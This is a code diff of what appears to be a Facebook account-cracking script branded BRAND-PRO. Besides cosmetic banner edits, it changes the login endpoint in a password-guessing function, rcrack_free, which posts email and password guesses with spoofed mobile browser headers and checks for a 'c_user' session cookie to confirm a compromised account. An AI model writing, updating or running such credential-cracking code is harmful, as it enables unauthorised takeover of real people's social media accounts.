@@ -71,7 +71,7 @@ def menu_apikey():
  
   os.system(f" clear")                          
   print(f"""\x1b[1;97m
-  .########..########.....###....##....##.########.
+ .########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -82,7 +82,7 @@ def menu_apikey():
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
 \033[97;1m>>     Version  : 0.0.1
-\033[97;1m>>     Tools  : BRAND-PRO
+\033[97;1m>>     Tools    : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
   print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
@@ -120,7 +120,7 @@ def menu_apikey():
     	menu_apikey()
 #menu_apikey()
 logo=(f"""
-.########..########.....###....##....##.########.
+ .########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -130,8 +130,8 @@ logo=(f"""
 \033[91;1m--------------------------------------------------
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
-\033[97;1m>>     Version  : 0.0.1
-\033[97;1m>>     Tools  : BRAND-PRO
+\033[97;1m>>     Version  : \33[1;91m 0.0.1
+\033[97;1m>>     Tools    : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
 def linex():
@@ -699,7 +699,7 @@ def rcrack_free(idf,pwv):
 			"email":idf,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
+			header_freefb = {'authority':'m.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -714,7 +714,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
-			lo = session.post('https://free.facebook.com/login/save-device/?login_source=login&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+			lo = session.post('https://m.facebook.com/login/device-based/validate-pin/?refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
